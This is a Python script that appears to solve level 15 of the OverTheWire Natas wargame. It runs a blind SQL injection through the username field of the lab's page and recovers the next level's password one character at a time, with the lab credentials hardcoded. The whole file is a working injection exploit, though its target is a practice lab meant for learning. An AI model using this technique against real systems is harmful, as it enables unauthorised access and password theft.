#!/usr/bin/env python
import requests

# 'username': "natas15"
# 'password': "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def is_true(p):
    url = "http://natas15.natas.labs.overthewire.org?debug"
    headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
    # payload = {'username': 'natas16" and password like binary "%' + p +'%', 'debug': 'yes'}
    payload = {'username': 'natas16" and password like binary "' + p +'%', 'debug': 'yes'}

    r = requests.post(url, data=payload, headers=headers )

    # print r.text
    if "exists" in r.text:
        return True

# 1st pass
# chars = ""
# for i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
#     if is_true(i):
#         chars = chars + i
# print chars

chars = "BEHINORWacehijmnpqtw03569"
i=1
passwd = ""
while len(passwd) < 32:
    for c in chars:
        if is_true(passwd + c):
            passwd = passwd + c
            print passwd
